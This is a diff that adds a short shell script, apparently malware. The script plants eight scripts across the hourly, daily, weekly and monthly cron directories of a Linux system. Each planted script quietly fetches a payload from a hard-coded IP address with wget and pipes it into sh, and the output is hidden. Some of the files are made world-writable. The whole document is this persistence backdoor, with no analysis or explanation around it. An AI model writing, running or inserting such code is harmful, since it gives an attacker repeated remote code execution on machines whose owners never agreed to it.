@@ -1,0 +1,10 @@
+#!/bin/bsh
+
+echo -e '#!/bin/sh\n\nwget --quiet http://159.253.7.22/DICKS -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.hourly/2;chmod +x /etc/cron.hourly/2;
+echo -e '#!/bin/sh\n\nwget --quiet http://159.253.7.22/DICKS -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.hourly/3;chmod +x /etc/cron.hourly/3;
+echo -e '#!/bin/sh\n\nwget --quiet http://159.253.7.22/DICKS -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.daily/2;chmod +x /etc/cron.daily/2;
+echo -e '#!/bin/sh\n\nwget --quiet http://159.253.7.22/DICKS -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.daily/3;chmod +x /etc/cron.daily/3;
+echo -e '#!/bin/sh\n\nwget --quiet http://159.253.7.22/DICKS -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.weekly/2;chmod +x /etc/cron.weekly/2;
+echo -e '#!/bin/sh\n\nwget --quiet http://159.253.7.22/DICKS -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.weekly/3;chmod +x /etc/cron.weekly/3;
+echo -e '#!/bin/sh\n\nwget --quiet http://159.253.7.22/DICKS -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.monthly/2;chmod 777 /etc/cron.monthly/2;
+echo -e '#!/bin/sh\n\nwget --quiet http://159.253.7.22/DICKS -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.monthly/3;chmod 777 /etc/cron.monthly/3;
